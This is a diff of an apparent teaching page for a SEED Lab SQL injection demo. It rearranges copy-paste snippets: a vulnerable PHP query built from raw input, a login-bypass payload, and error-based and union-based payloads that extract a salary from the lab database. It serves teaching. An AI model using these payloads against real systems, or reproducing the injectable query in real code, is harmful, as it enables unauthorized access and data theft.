@@ -22,17 +22,18 @@
     <p>This simple page contains code snippets and payloads from your presentation for easy copy-paste into the SEED Lab VM. Use for live demos. Each section has a "Copy" button.</p>
 
     <h2>1. Vulnerable Code Example (PHP from SEED Lab)</h2>
-    <pre id="inband-bypass">admin' # </pre>
-    <button onclick="copyToClipboard('inband-bypass')">Copy Login Bypass Payload</button>
     
     <pre id="vuln-code">$sql = "SELECT id, name, eid, salary, birth, ssn, address, email, nickname, Password FROM credential WHERE name='$input_uname' and Password='$hashed_pwd';";</pre>
     <button onclick="copyToClipboard('vuln-code')">Copy Vulnerable Code</button>
 
     <h2>2. Malicious Payloads for In-band SQLi</h2>
+    <pre id="inband-bypass">admin' # </pre>
+    <button onclick="copyToClipboard('inband-bypass')">Copy Login Bypass Payload</button>
+    
     <pre id="inband-error">nonexistent' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT Salary FROM credential WHERE name='Alice'), 0x7e)) = 1 -- </pre>
     <button onclick="copyToClipboard('inband-error')">Copy Error-based Payload</button>
 
-    <pre id="inband-union">nonexistent' AND 1=0 UNION SELECT 1,(SELECT Salary FROM credential WHERE name='Alice'),3,4,5,6,7,8,9,10,11 –- </pre>
+    <pre id="inband-union">nonexistent' AND 1=0 UNION SELECT 1,(SELECT Salary FROM credential WHERE name='Alice'),3,4,5,6,7,8,9,10,11 -- </pre>
     <button onclick="copyToClipboard('inband-union')">Copy Union-based Payload</button>
 
     <h2>3. Malicious Payloads for Blind SQLi (Alice's SSN: 10211002)</h2>
